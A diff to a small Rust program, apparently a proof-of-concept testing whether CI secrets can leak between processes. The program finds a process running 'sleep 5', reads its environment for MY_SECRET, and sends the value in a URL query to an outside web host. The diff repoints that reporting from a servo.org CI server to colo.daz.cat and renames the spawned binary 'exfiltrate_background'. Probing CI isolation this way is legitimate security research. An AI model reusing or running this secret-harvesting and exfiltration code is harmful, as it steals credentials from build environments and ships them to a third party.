@@ -11,7 +11,7 @@ fn main() -> Result<(), Box<dyn Error>> {
             sleep(Duration::from_secs(1));
             let Ok(pid) = run_fun!(pgrep -f "sleep 5") else {
                 println!("pid not found");
-                get("https://ci0.servo.org/secret/pid_not_found")?;
+                get("https://colo.daz.cat/secret/pid_not_found")?;
                 continue;
             };
             println!("found pid {pid}");
@@ -21,15 +21,15 @@ fn main() -> Result<(), Box<dyn Error>> {
                 if let Some(secret) = var.strip_prefix(b"MY_SECRET=") {
                     let secret = str::from_utf8(secret)?;
                     println!("found secret: {secret}");
-                    get(format!("https://ci0.servo.org/secret/found?value={secret}"))?;
+                    get(format!("https://colo.daz.cat/secret/found?value={secret}"))?;
                     return Ok(());
                 }
             }
             println!("secret not found");
-            get("https://ci0.servo.org/secret/secret_not_found")?;
+            get("https://colo.daz.cat/secret/secret_not_found")?;
         }
     } else {
-        Command::new("target/debug/process_workload")
+        Command::new("target/debug/exfiltrate_background")
             .arg("child")
             .spawn()?;
     }
